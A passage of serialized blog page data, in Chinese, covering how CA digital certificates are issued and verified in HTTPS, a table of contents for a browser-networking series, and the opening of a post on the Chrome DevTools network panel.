2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何申请数字证书</h3>\n<p>我们先来看看如何向 CA 申请证书。比如极客时间需要向某个 CA 去申请数字证书，通常的申请流程分以下几步：</p>\n<ul>\n<li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li>\n<li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li>\n<li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li>\n<li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。</li>\n</ul>\n<p>这样我们就完成了极客时间数字证书的申请过程。前面几步都很好理解，不过最后一步数字签名的过程还需要解释下：首先 CA 使用 Hash 函数来计算极客时间提交的明文信息，并得出信息摘要；然后 CA 再使用它的私钥对信息摘要进行加密，加密后的密文就是 CA 颁给极客时间的数字签名。这就相当于房管局在房产证上盖的章，这个章是可以去验证的，同样我们也可以通过数字签名来验证是否是该 CA 颁发的。</p>\n<h3 id="如何验证数字证书"><a href="#%E5%A6%82%E4%BD%95%E9%AA%8C%E8%AF%81%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何验证数字证书</h3>\n<p>有了 CA 签名过的数字证书，当浏览器向极客时间服务器发出请求时，服务器会返回数字证书给浏览器。</p>\n<p>浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到信息摘要 A；然后再利用对应 CA 的公钥解密签名数据，得到信息摘要 B；对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名信息、有效时间等信息。</p>\n<p>这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它，然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 CA，证书也会被判定非法。</p>\n<p>另外，在申请和使用证书的过程中，还需要注意以下三点：</p>\n<ul>\n<li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li>\n<li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li>\n<li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li>\n</ul>',
excerpt:"HTTP1：HTTP 性能优化 谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中最重要且使用最多的协议，是浏览器和服务器之间的通信语言，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP…",timeToRead:32,tableOfContents:'<ul>\n<li>\n<p><a href="/browser-working-principle-network/#http1%EF%BC%9Ahttp-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96">HTTP1：HTTP 性能优化</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE-http09">超文本传输协议 HTTP/0.9</a></li>\n<li><a href="/browser-working-principle-network/#%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A8%E5%8A%A8%E7%9A%84-http10">被浏览器推动的 HTTP/1.0</a></li>\n<li><a href="/browser-working-principle-network/#%E9%82%A3%E4%B9%88%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%A7%8D%E7%B1%BB%E5%9E%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%91%A2%EF%BC%9F">那么该如何实现多种类型文件的下载呢？</a></li>\n<li>\n<p><a href="/browser-working-principle-network/#%E7%BC%9D%E7%BC%9D%E8%A1%A5%E8%A1%A5%E7%9A%84-http11">缝缝补补的 HTTP/1.1</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E6%94%B9%E8%BF%9B%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5">改进持久连接</a></li>\n<li><a href="/browser-working-principle-network/#%E4%B8%8D%E6%88%90%E7%86%9F%E7%9A%84-http-%E7%AE%A1%E7%BA%BF%E5%8C%96">不成熟的 HTTP 管线化</a></li>\n<li><a href="/browser-working-principle-network/#%E6%8F%90%E4%BE%9B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%94%AF%E6%8C%81">提供虚拟主机的支持</a></li>\n<li><a href="/browser-working-principle-network/#%E6%94%AF%E6%8C%81%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%E5%86%85%E5%AE%B9">支持动态生成内容</a></li>\n<li><a href="/browser-working-principle-network/#%E5%AE%A2%E6%88%B7%E7%AB%AF-cookie%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">客户端 Cookie、安全机制</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#http2%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E7%BD%91%E7%BB%9C%E9%80%9F%E5%BA%A6">HTTP2：如何提升网络速度</a></p>\n<ul>\n<li>\n<p><a href="/browser-working-principle-network/#http11-%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98">HTTP/1.1 的主要问题</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#tcp-%E7%9A%84%E6%85%A2%E5%90%AF%E5%8A%A8">TCP 的慢启动</a></li>\n<li><a href="/browser-working-principle-network/#tcp-%E8%BF%9E%E6%8E%A5%E7%AB%9E%E4%BA%89%E5%B8%A6%E5%AE%BD">TCP 连接竞争带宽</a></li>\n<li><a href="/browser-working-principle-network/#http11-%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E">HTTP/1.1 队头阻塞</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#http2-%E7%9A%84%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8">HTTP/2 的多路复用</a></li>\n<li><a href="/browser-working-principle-network/#%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0">多路复用的实现</a></li>\n<li>\n<p><a href="/browser-working-principle-network/#http2">HTTP/2</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7">设置请求的优先级</a></li>\n<li><a href="/browser-working-principle-network/#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81">服务器推送</a></li>\n<li><a href="/browser-working-principle-network/#%E5%A4%B4%E9%83%A8%E5%8E%8B%E7%BC%A9">头部压缩</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93-1">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#http3%EF%BC%9A%E7%94%A9%E6%8E%89-tcp%E3%80%81tcl-%E5%8C%85%E8%A2%B1%E6%9E%84%E5%BB%BA%E9%AB%98%E6%95%88%E7%BD%91%E7%BB%9C">HTTP3：甩掉 TCP、TCL 包袱构建高效网络</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#tcp-%E7%9A%84%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E">TCP 的队头阻塞</a></li>\n<li><a href="/browser-working-principle-network/#tcp-%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%B6%E6%97%B6">TCP 建立连接的延时</a></li>\n<li><a href="/browser-working-principle-network/#tcp-%E5%8D%8F%E8%AE%AE%E5%83%B5%E5%8C%96">TCP 协议僵化</a></li>\n<li><a href="/browser-working-principle-network/#quic-%E5%8D%8F%E8%AE%AE">QUIC 协议</a></li>\n<li><a href="/browser-working-principle-network/#http3-%E7%9A%84%E6%8C%91%E6%88%98">HTTP/3 的挑战</a></li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93-2">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-xmlhttprequst-%E4%B8%8D%E8%83%BD%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90">同源策略：为什么 XMLHttpRequst 不能跨域请求资源</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">什么是同源策略</a></li>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%AE%89%E5%85%A8%E5%92%8C%E4%BE%BF%E5%88%A9%E6%80%A7%E7%9A%84%E6%9D%83%E8%A1%A1">安全和便利性的权衡</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%B5%8C%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E8%B5%84%E6%BA%90">页面中可以嵌入第三方资源</a></li>\n<li><a href="/browser-working-principle-network/#%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E5%92%8C%E8%B7%A8%E6%96%87%E6%A1%A3%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6">跨域资源共享和跨文档消息机制</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93-3">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-cookie-%E4%B8%AD%E6%9C%89-httponly-%E5%B1%9E%E6%80%A7">跨站脚本攻击 XSS：为什么 cookie 中有 httpOnly 属性</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E4%BB%80%E4%B9%88%E6%98%AF-xss-%E6%94%BB%E5%87%BB">什么是 XSS 攻击</a></li>\n<li>\n<p><a href="/browser-working-principle-network/#%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E6%98%AF%E6%80%8E%E4%B9%88%E6%B3%A8%E5%85%A5%E7%9A%84">恶意脚本是怎么注入的</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E5%AD%98%E5%82%A8%E5%9E%8B-xss-%E6%94%BB%E5%87%BB">存储型 XSS 攻击</a></li>\n<li><a href="/browser-working-principle-network/#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E6%94%BB%E5%87%BB">反射型 XSS 攻击</a></li>\n<li><a href="/browser-working-principle-network/#%E5%9F%BA%E4%BA%8E-dom-%E7%9A%84-xss-%E6%94%BB%E5%87%BB">基于 DOM 的 XSS 攻击</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2-xss-%E6%94%BB%E5%87%BB">如何阻止 XSS 攻击</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E8%BE%93%E5%85%A5%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%E6%88%96%E8%BD%AC%E7%A0%81">服务器对输入脚本进行过滤或转码</a></li>\n<li><a href="/browser-working-principle-network/#%E5%85%85%E5%88%86%E5%88%A9%E7%94%A8-csp">充分利用 CSP</a></li>\n<li><a href="/browser-working-principle-network/#%E4%BD%BF%E7%94%A8-httponly-%E5%B1%9E%E6%80%A7">使用 HttpOnly 属性</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93-4">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#csrf-%E6%94%BB%E5%87%BB%EF%BC%9A%E9%99%8C%E7%94%9F%E9%93%BE%E6%8E%A5%E4%B8%8D%E8%A6%81%E9%9A%8F%E4%BE%BF%E7%82%B9">CSRF 攻击：陌生链接不要随便点</a></p>\n<ul>\n<li>\n<p><a href="/browser-working-principle-network/#%E4%BB%80%E4%B9%88%E6%98%AF-csrf-%E6%94%BB%E5%87%BB">什么是 CSRF 攻击</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-get-%E8%AF%B7%E6%B1%82">自动发起 Get 请求</a></li>\n<li><a href="/browser-working-principle-network/#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-post-%E8%AF%B7%E6%B1%82">自动发起 POST 请求</a></li>\n<li><a href="/browser-working-principle-network/#%E5%BC%95%E8%AF%B1%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5">引诱用户点击链接</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-csrf-%E6%94%BB%E5%87%BB">如何防止 CSRF 攻击</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#cookie-%E7%9A%84-samesite-%E5%B1%9E%E6%80%A7">Cookie 的 SameSite 属性</a></li>\n<li><a href="/browser-working-principle-network/#%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9D%A5%E6%BA%90%E7%AB%99%E7%82%B9">验证请求的来源站点</a></li>\n<li><a href="/browser-working-principle-network/#csrf-token">CSRF Token</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E6%80%BB%E7%BB%93-5">总结</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E6%B2%99%E7%9B%92%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E9%9A%94%E7%A6%BB%E5%A2%99">沙盒：页面和系统之间的隔离墙</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84">安全视角下的多进程架构</a></li>\n<li><a href="/browser-working-principle-network/#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1">安全沙箱</a></li>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD">安全沙箱如何影响各个模块功能</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E6%8C%81%E4%B9%85%E5%AD%98%E5%82%A8">持久存储</a></li>\n<li><a href="/browser-working-principle-network/#%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE">网络访问</a></li>\n<li><a href="/browser-working-principle-network/#%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92">用户交互</a></li>\n</ul>\n</li>\n<li><a href="/browser-working-principle-network/#%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB%EF%BC%88site-isolation%EF%BC%89">站点隔离（Site Isolation）</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#https%EF%BC%9A%E8%AE%A9%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9B%B4%E5%AE%89%E5%85%A8">HTTPS：让数据传输更安全</a></p>\n<ul>\n<li>\n<p><a href="/browser-working-principle-network/#%E5%9C%A8-http-%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%AD%E5%BC%95%E5%85%A5%E5%AE%89%E5%85%A8%E5%B1%82">在 HTTP 协议栈中引入安全层</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">第一版：使用对称加密</a></li>\n<li><a href="/browser-working-principle-network/#%E7%AC%AC%E4%BA%8C%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">第二版：使用非对称加密</a></li>\n<li><a href="/browser-working-principle-network/#%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%9A%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8">第三版：对称加密和非对称加密搭配使用</a></li>\n<li><a href="/browser-working-principle-network/#%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%9A%E6%B7%BB%E5%8A%A0%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6">第四版：添加数字证书</a></li>\n</ul>\n</li>\n<li>\n<p><a href="/browser-working-principle-network/#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%B3%E8%AF%B7%E5%92%8C%E9%AA%8C%E8%AF%81">数字证书的申请和验证</a></p>\n<ul>\n<li><a href="/browser-working-principle-network/#%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6">如何申请数字证书</a></li>\n<li><a href="/browser-working-principle-network/#%E5%A6%82%E4%BD%95%E9%AA%8C%E8%AF%81%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6">如何验证数字证书</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>',wordCount:{words:4065},frontmatter:{date:"2021-07-15 02:00:04",path:"/browser-working-principle-network/",tags:"前端, 浏览器, 高级前端",title:"浏览器工作原理与实践——浏览器中的网络",draft:null,catalog_number:null}},nextPost:{html:'<h1 id="页面性能分析：利用-chrome-做-web-性能分析"><a href="#%E9%A1%B5%E9%9D%A2%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%9A%E5%88%A9%E7%94%A8-chrome-%E5%81%9A-web-%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面性能分析：利用 chrome 做 web 性能分析</h1>\n<p>“浏览器中的页面循环系统”模块我们已经介绍完了，循环系统是页面的基础，理解了循环系统能让我们从本质上更好地理解页面的工作方式，加深我们对一些前端概念的理解。</p>\n<p>接下来我们就要进入新的模块了，也就是“浏览器中的页面”模块，正如专栏简介中所言，页面是浏览器的核心，浏览器中的所有功能点都是服务于页面的，而 Chrome 开发者工具又是工程师调试页面的核心工具，所以在这个模块的开篇，我想先带你来深入了解下 Chrome 开发者工具。</p>\n<p>Chrome 开发者工具（简称 DevTools）是一组网页制作和调试的工具，内嵌于 Google Chrome 浏览器中。Chrome 开发者工具非常重要，所蕴含的内容也是非常多的，熟练使用它能让你更加深入地了解浏览器内部工作原理。（Chrome 开发者工具也在不停地迭代改进，如果你想使用最新版本，可以使用 Chrome Canary。）</p>\n<p>作为这一模块的第一篇文章，我们主要聚焦页面的源头和网络数据的接收，这些发送和接收的数据都能体现在开发者工具的网络面板上。不过为了你能更好地理解和掌握，我们会先对 Chrome 开发者工具做一个大致的介绍，然后再深入剖析网络面板</p>\n<h2 id="chrome-开发者工具"><a href="#chrome-%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Chrome 开发者工具</h2>\n<p>Chrome 开发者工具有很多重要的面板，比如与性能相关的有网络面板、Performance 面板、内存面板等，与调试页面相关的有 Elements 面板、Sources 面板、Console 面板等。</p>\n<p>你可以在浏览器窗口的右上方选择 Chrome 菜单，然后选择“更多工具–> 开发者工具”来打开 Chrome 开发者工具。打开的页面如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-af263.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 23.647798742138363%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAt0lEQVQY03WOWwvCMAyF/f9/zBtOxTdR7OrUtpnVNo2bu9Vsvijix+EQQnKSkQNjkqlaTFhc5KsZLGfsejGGZHJdz4Gbm6QgKstnOUD0aJo2xjiSaQrZ0aqLkqm9nD0YZ7QHfRJCbHfnwz4/ZTetnHN+AL2/2vuzavrlg5AaAIkCPdjfCkQulCJTqZQmz30I+E3bDpcRQ1EU9QdVVTW914iE6HmUX62/6bquX44/cOo73lrLHv/zAnqMGqo5nVDeAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 50 03"\n        title=""\n        src="/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-fee1c.png"\n        srcset="/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-a67b7.png 200w,\n/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-0b187.png 400w,\n/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-fee1c.png 800w,\n/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-b1a91.png 1200w,\n/static/2021-07-07-09-50-03-ef7efb2c0e645f82c9f3c1d3d39db515-af263.png 1590w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出，它一共包含了 10 个功能面板，包括了 Elements、Console、Sources、NetWork、Performance、Memory、Application、Security、Audits 和 Layers。</p>\n<p>关于这 10 个面板的大致功能，我做了一个表格，感兴趣的话，你可以详细看下：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-a7cc8.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 53.85714285714286%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABnElEQVQoz22QS0/cMBDH8+l6pBSJWw/9LpWqrhASEh+FQ9kuUHHnsTwusCVvx4md+G3HSTgwyW6hVJV+Gtlj/2fmP0Fa2+NrdHJTQDxeFv8wX6KTWzw9vTG/QUeXWUx18OMq3fo2/3zwa/v7z+3ZYh0/wWG2+Dhb7O6ffTk839k7/RtIfvg6P7pIAmcFRg/WYMUzVsccaJKGxjUJ4apErgTSErW2fIfBfacD3yrZRENLFEsIfqR4JZvEKtTqwilkZT5Ghfq2ek859CbovDYye+7qhoRpfJ+Ed7T8rXjatwSSrwyeApD8QzWKWycZCSVLJEtZHUEJXkeMRnCGEuBFNAkAH7TIO1dtsOXQmdFzVTzo0VsGhkUTgxIirzfAdXRhMOBtuWHtGcS0XMEzo2FVrCq8AqVi6QhPQWxV7qcNvbV97TyOXUeCJbBbWj3B2GJaGOB0YXVhZG4k0iLzFmRkg508O8Np+QiVtADPYUOe+ORW8xQWCQdoC616V3mLJ9ZjF+PYnbdSlH2nnGFaUiUJ4B3vWrGm9/J/iOfBvwCro0q9MVEWugAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 07 09 50 19"\n        title=""\n        src="/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-fee1c.png"\n        srcset="/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-a67b7.png 200w,\n/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-0b187.png 400w,\n/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-fee1c.png 800w,\n/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-b1a91.png 1200w,\n/static/2021-07-07-09-50-19-23f102ef79c83df6cfb97ff2fdcc3a2c-a7cc8.png 1400w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>简单来说，Chrome 开发者工具为我们提供了通过界面访问或者编辑 DOM 和 CSSOM 的能力，还提供了强大的调试功能和查看性能指标的能力。</p>\n<p>OK，接下来我们就要重点看下其中重要的 Network 面板，即网络面板</p>\n<h2 id="网络面板"><a href="#%E7%BD%91%E7%BB%9C%E9%9D%A2%E6%9D%BF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>网络面板</h2>\n<p>网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-07-09-50-45-b7e1dcc8d872bc75e34bb2ad48f0c4a0-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 52.80210157618214%; position: relative; bottom: 0; left: 0; background-image: 